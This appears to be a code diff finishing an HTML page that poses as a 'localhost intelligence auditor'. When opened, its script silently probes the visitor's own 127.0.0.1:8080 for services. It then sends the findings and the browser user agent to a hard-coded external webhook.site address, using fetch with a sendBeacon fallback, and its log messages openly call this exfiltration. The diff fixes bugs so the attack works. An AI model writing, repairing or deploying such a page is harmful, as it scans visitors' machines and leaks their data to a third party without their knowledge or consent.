@@ -1,3 +1,30 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <title>Service Mapper Pro - Webhook Fixed</title>
+    <style>
+        body { background-color: #0e1013; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #161b22; width: 620px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #30363d; overflow: hidden; }
+        .header { background: #21262d; padding: 20px; text-align: center; border-bottom: 1px solid #30363d; }
+        h2 { margin: 0; color: #58a6ff; font-weight: 500; }
+        .terminal { padding: 20px; height: 350px; overflow-y: auto; font-family: 'Consolas', monospace; font-size: 14px; line-height: 1.6; background: #0d1117; }
+        .line { margin-bottom: 8px; border-bottom: 1px solid #1f242c; padding-bottom: 4px; }
+        .tag { padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; text-transform: uppercase; margin-right: 10px; }
+        .tag-found { background: #238636; color: white; }
+        .tag-error { background: #da3633; color: white; }
+        .tag-info { background: #388bfd; color: white; }
+        .footer { padding: 15px; text-align: center; font-size: 12px; color: #8b949e; background: #161b22; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="header"><h2>Localhost Intelligence Auditor</h2></div>
+    <div id="log" class="terminal"><div class="line"><span class="tag tag-info">SYSTEM</span> Initializing Deep Scan...</div></div>
+    <div class="footer">Targeting: 127.0.0.1:8080 | Status: <span id="status">Scanning...</span></div>
+</div>
+
 <script>
     // TERA WEBHOOK URL
     const WEBHOOK = "https://webhook.site/5c8dfb93-43de-4bdc-8216-4895cb4b323d";
@@ -7,7 +34,7 @@
     function log(msg, type = "info") {
         const div = document.createElement('div');
         div.className = "line";
-        let tagClass = type === "found" ? "tag-found" : (type === "error" ? "tag-missing" : "tag-info");
+        let tagClass = type === "found" ? "tag-found" : (type === "error" ? "tag-error" : "tag-info");
         let tagName = type === "found" ? "FOUND" : (type === "error" ? "MISSING" : "INFO");
         div.innerHTML = `<span class="tag ${tagClass}">${tagName}</span> ${msg}`;
         logBox.appendChild(div);
@@ -18,7 +45,7 @@
         return new Promise((resolve) => {
             if (isHTML) {
                 const controller = new AbortController();
-                setTimeout(() => controller.abort(), 2000);
+                const timeout = setTimeout(() => controller.abort(), 2000);
 
                 fetch(`http://127.0.0.1:8080${path}`, { mode: 'no-cors', signal: controller.signal })
                     .then(() => {
@@ -28,7 +55,8 @@
                     .catch(() => {
                         log(`${name} not found`, "error");
                         resolve({ name, path, status: "MISSING" });
-                    });
+                    })
+                    .finally(() => clearTimeout(timeout));
             } else {
                 const img = new Image();
                 img.onload = () => {
@@ -64,14 +92,13 @@
         statusText.innerText = "Audit Complete";
         log(`Exfiltrating data...`);
 
-        // --- FIX STARTS HERE ---
         const report = {
             ts: new Date().toISOString(),
             ua: navigator.userAgent,
             results: scanResults
         };
 
-        // Option 1: Using Blob for Clean JSON in no-cors
+        // FIXED: Using Blob for Clean JSON exfiltration in no-cors
         const blob = new Blob([JSON.stringify(report)], {type : 'text/plain'});
         
         fetch(WEBHOOK, {
@@ -79,11 +106,14 @@
             mode: 'no-cors',
             body: blob
         }).then(() => {
-            log("Report sent to Webhook!", "found");
+            log("Report successfully exfiltrated!", "found");
         }).catch(() => {
-            // Option 2: Beacon API (Even more reliable)
+            // Backup method: Beacon API
             navigator.sendBeacon(WEBHOOK, JSON.stringify(report));
             log("Report sent via Beacon.");
         });
     };
 </script>
+
+</body>
+</html>
